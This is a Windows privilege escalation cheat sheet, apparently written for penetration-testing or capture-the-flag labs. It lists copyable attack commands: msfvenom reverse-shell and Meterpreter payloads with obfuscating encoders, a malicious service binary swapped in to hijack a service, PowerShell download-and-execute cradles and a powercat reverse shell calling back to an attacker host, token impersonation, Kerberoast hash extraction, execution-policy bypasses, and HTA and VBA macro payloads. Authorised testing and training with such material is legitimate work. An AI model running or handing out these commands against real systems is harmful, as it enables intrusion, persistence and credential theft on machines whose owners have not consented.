# Windows Privilege Escalation
Commands for escalating privileges on Windows systems

## Useful Links
- [HackTricks - Windows Privilege Escalation Checklist](https://book.hacktricks.xyz/windows-hardening/checklist-windows-privilege-escalation)
- [GhostPack/Seatbelt](https://github.com/GhostPack/Seatbelt)
- [411Hall/JAWS](https://github.com/411Hall/JAWS)
- [LOLBAS Project](https://lolbas-project.github.io/)
- [Red-Teaming-Toolkit - Payload Development](https://github.com/infosecn1nja/Red-Teaming-Toolkit#Payload%20Development)

## PowerUp Checks

### Upload PowerUp.ps1 (Meterpreter)
```bash copy
upload /home/kali/Desktop/PowerUp.ps1
```
- Uploads PowerUp.ps1 to the target system via Meterpreter.


### Load PowerShell in Meterpreter
```bash copy
load powershell
```
- Loads the PowerShell module in Meterpreter.


### Open PowerShell shell
```bash copy
powershell_shell
```
- Opens an interactive PowerShell session in Meterpreter.


### Run PowerUp.ps1
```powershell copy
. .\PowerUp.ps1
```
- Loads the PowerUp.ps1 script in PowerShell.


### Run all PowerUp checks
```powershell copy
Invoke-AllChecks
```
- Executes all privilege escalation checks in PowerUp.ps1.


## Service Exploitation

### Stop WindowsScheduler service
```powershell copy
Stop-Service -Name "WindowsScheduler"
```
- Stops the WindowsScheduler service if exploitable.
- `-Name "WindowsScheduler"`: Specifies the service.

### Check WindowsScheduler service status
```powershell copy
Get-Service -Name "WindowsScheduler"
```
- Displays the status of the WindowsScheduler service.
- `-Name "WindowsScheduler"`: Specifies the service.

### Generate reverse shell service
```bash copy
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=1234 -e x86/shikata_ga_nai -f exe-service -o WService.exe
```
- Creates a reverse shell executable disguised as a service.
- `-p windows/shell_reverse_tcp`: Payload type.
- `LHOST=10.10.10.10`: Attacker IP.
- `LPORT=1234`: Attacker port.
- `-e x86/shikata_ga_nai`: Encoder for obfuscation.
- `-f exe-service`: Output as service executable.
- `-o WService.exe`: Output file.

### Upload malicious service (Meterpreter)
```bash copy
upload /home/kali/WService.exe "C:\\Program Files (x86)\\IObit\\Advanced SystemCare\\WService.exe"
```
- Uploads the malicious service executable to the target.


### Start WindowsScheduler service
```powershell copy
Start-Service -Name "WindowsScheduler"
```
- Starts the WindowsScheduler service to trigger the payload.
- `-Name "WindowsScheduler"`: Specifies the service.

## PowerShell Reverse Shell

### Execute PowerShell reverse shell
```powershell copy
powershell iex (New-Object Net.WebClient).DownloadString('http://10.10.10.10:80/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.10.10.10 -Port 1234
```
- Downloads and runs a PowerShell reverse shell connecting to attacker.
- `iex`: Executes downloaded script.
- `-Reverse`: Reverse shell mode.
- `-IPAddress 10.10.10.10`: Attacker IP.
- `-Port 1234`: Attacker port.

## Meterpreter Reverse Shell

### Generate Meterpreter reverse shell
```bash copy
msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=10.10.10.10 LPORT=1234 -f exe -o shell-name.exe
```
- Creates a Meterpreter reverse shell executable.
- `-p windows/meterpreter/reverse_tcp`: Payload type.
- `-a x86`: 32-bit architecture.
- `--encoder x86/shikata_ga_nai`: Obfuscation encoder.
- `LHOST=10.10.10.10`: Attacker IP.
- `LPORT=1234`: Attacker port.
- `-f exe`: Output as executable.
- `-o shell-name.exe`: Output file.

### Start Metasploit handler
```bash copy
sudo msfconsole
```
- Launches the Metasploit console.


```bash copy
use exploit/multi/handler
```
- Selects the multi-handler exploit module.


```bash copy
set PAYLOAD windows/meterpreter/reverse_tcp
```
- Sets the Meterpreter reverse TCP payload.


```bash copy
set LHOST 10.10.10.10
```
- Sets the attacker IP for the handler.


```bash copy
set LPORT 1234
```
- Sets the attacker port for the handler.


```bash copy
run -j
```
- Runs the handler in the background.
- `-j`: Runs as a background job.

### Download and run Meterpreter shell
```powershell copy
powershell (New-Object System.Net.WebClient).DownloadFile('http://10.10.10.10:80/shell-name.exe','shell-name.exe')
```
- Downloads the Meterpreter executable from the attacker’s server.


```powershell copy
Start-Process "shell-name.exe"
```
- Executes the Meterpreter shell.


### Download and run via cmd
```cmd copy
cd %temp%
```
- Changes to the temporary directory.


```cmd copy
powershell -c "Invoke-WebRequest -Uri 'http://10.10.10.10:80/shell-name.exe' -OutFile 'C:\Windows\Temp\shell-name.exe'"
```
- Downloads the Meterpreter executable using PowerShell.
- `-c`: Runs PowerShell command.
- `-Uri`: Specifies URL.
- `-OutFile`: Specifies output file.

```cmd copy
powershell -c "Start-Process 'C:\Windows\Temp\shell-name.exe'"
```
- Executes the Meterpreter shell via PowerShell.
- `-c`: Runs PowerShell command.

## Token Impersonation (Meterpreter)

### Load incognito
```bash copy
load incognito
```
- Loads the incognito module for token impersonation.


### List group tokens
```bash copy
list_tokens -g
```
- Lists group tokens available for impersonation.
- `-g`: Group tokens.

### Impersonate Administrators token
```bash copy
impersonate_token "BUILTIN\Administrators"
```
- Impersonates the Administrators group token.


### Get current user ID
```bash copy
getuid
```
- Displays the current user ID in Meterpreter.


### Get current process ID
```bash copy
getpid
```
- Shows the current process ID in Meterpreter.


### List processes
```bash copy
ps
```
- Lists running processes in Meterpreter.


### Migrate to another process
```bash copy
migrate 676
```
- Migrates Meterpreter to another process (PID 676).


## Kerberoast Attack

### Bypass PowerShell execution policy
```powershell copy
powershell -ep bypass
```
- Bypasses PowerShell execution policy for script execution.
- `-ep bypass`: Bypasses execution policy.

### Download Kerberoast script
```powershell copy
iex(New-Object Net.WebClient).DownloadString('http://10.10.10.10:80/Invoke-Kerberoast.ps1')
```
- Downloads and executes the Invoke-Kerberoast.ps1 script.
- `iex`: Executes the downloaded script.

### Run Kerberoast
```powershell copy
Invoke-Kerberoast -OutputFormat hashcat | fl
```
- Extracts Kerberos ticket hashes in hashcat format and formats output as a list.
- `-OutputFormat hashcat`: Outputs hashes in hashcat-compatible format.
- `| fl`: Formats output as a list.

## HTA Payload

### HTA payload
```html copy
<html>
<body>
<script>
	var c= 'cmd.exe'
	new ActiveXObject('WScript.Shell').Run(c);
</script>
</body>
</html>
```
- Executes `cmd.exe` via an HTA file.

```bash copy
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=1234 -f hta-psh -o thm.hta
```
- Generates an HTA reverse shell payload.
- `-p windows/x64/shell_reverse_tcp`: Payload type.
- `LHOST=10.10.10.10`: Attacker IP.
- `LPORT=1234`: Attacker port.
- `-f hta-psh`: HTA PowerShell format.
- `-o thm.hta`: Output file.

### Use HTA server
```bash copy
use exploit/windows/misc/hta_server
```
- Sets up Metasploit’s HTA server for payload delivery.


## VBA Payload

### VBA payload
```vba copy
Sub AutoOpen()
        Auto_Open
End Sub
Sub Workbook_Open()
        Auto_Open
End Sub
Sub Document_Open()
        Auto_Open
End Sub
```
- Triggers a VBA payload on document or workbook open.

```bash copy
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=1234 -f vba
```
- Generates a VBA Meterpreter reverse shell.
- `-p windows/meterpreter/reverse_tcp`: Payload type.
- `LHOST=10.10.10.10`: Attacker IP.
- `LPORT=1234`: Attacker port.
- `-f vba`: VBA format.

## PowerShell Script Execution

### Set PowerShell execution policy
```powershell copy
Set-ExecutionPolicy -Scope CurrentUser RemoteSigned
```
- Allows running remote PowerShell scripts for the current user.
- `-Scope CurrentUser`: Applies to current user.
- `RemoteSigned`: Allows remote scripts.

### Run PowerShell script
```powershell copy
powershell -ex bypass -File thm.ps1
```
- Executes a PowerShell script, bypassing execution policy.
- `-ex bypass`: Bypasses execution policy.
- `-File thm.ps1`: Specifies script file.

## Powercat Reverse Shell

### PowerShell reverse shell with powercat
```powershell copy
powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://10.10.10.10:8080/powercat.ps1');powercat -c 10.10.10.10 -p 1234 -e cmd"
```
- Downloads and runs powercat for a reverse shell.
- `-c`: Runs PowerShell command.
- `IEX`: Executes downloaded script.
- `-c 10.10.10.10`: Attacker IP.
- `-p 1234`: Attacker port.
- `-e cmd`: Executes cmd.exe.